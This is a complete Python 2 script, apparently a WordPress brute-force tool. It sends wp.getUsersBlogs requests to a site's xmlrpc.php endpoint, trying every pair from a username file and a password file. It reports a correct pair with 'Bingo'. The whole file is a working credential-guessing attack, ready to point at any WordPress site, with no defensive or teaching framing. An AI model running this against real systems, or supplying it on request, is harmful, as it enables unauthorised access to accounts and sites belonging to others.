import requests
import fileinput
import sys
import xml.etree.ElementTree as ET
from utilities import bcolors

# Printing Logo
print bcolors.HEADER + """
ooooooo__________ooooooo_________________________________
oo____oo__o___oo_oo_______ooooo__oo_ooo___ooooo___ooooo__
oo____oo__o___oo_oooo____oo___oo_ooo___o_oo___oo_oo____o_
oooooo____o___oo_oo______oo___oo_oo______oo______ooooooo_
oo_________ooooo_oo______oo___oo_oo______oo______oo______
oo_______o____oo_oo_______ooooo__oo_______ooooo___ooooo__
__________ooooo__________________________________________
"""
# Getting the data
url = raw_input(bcolors.ENDC + "Type the URL [http://www.myname.com/xmlrpc.php] : ")
users = raw_input(bcolors.ENDC + "Users File [blank for default] : ")
passwords = raw_input(bcolors.ENDC + "Passwords File [blank for default] : ")
# constants
users_file = users if users != "" else 'users.txt'
passwords_file = passwords if passwords != "" else 'passwords.txt'
headers = {'Content-Type': 'application/xml'}
xml = """
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
 <param>
  <value>
   <string>username</string>
  </value>
 </param>
 <param>
  <value>
   <string>password</string>
  </value>
 </param>
</params>
</methodCall>
"""
# Magic
try:
    with open(users_file, 'r') as users:
        for user in users:
            username = user.strip()
            with open(passwords_file, 'r') as passwords:
                for password in passwords:
                    post_xml = xml.replace('username', username).replace('password', password)
                    res = requests.post(url, data=post_xml, headers=headers)
                    tree = ET.ElementTree(ET.fromstring(res.text.encode('utf-8')))
                    root = tree.getroot()
                    if len(root.findall(".//fault/value/struct/member/value/int")) > 0:
                      if root.findall(".//fault/value/struct/member/value/int")[0].text == '403':
                          print bcolors.FAIL + str(username) + " : " + password.strip()
                    if len(root.findall(".//params/param/value/array/data/value/struct/member[1]/value/boolean")) > 0:
                      if root.findall(".//params/param/value/array/data/value/struct/member[1]/value/boolean")[0].text == '1':
                          print bcolors.OKGREEN + "Bingo ==> " + str(username) + " : " + password.strip()
                          close = raw_input("Do you want to exit? [y/n] ")
                          if close == 'y':
                              sys.exit()
except:
        sys.exit(bcolors.FAIL + "Closed or wrong input")
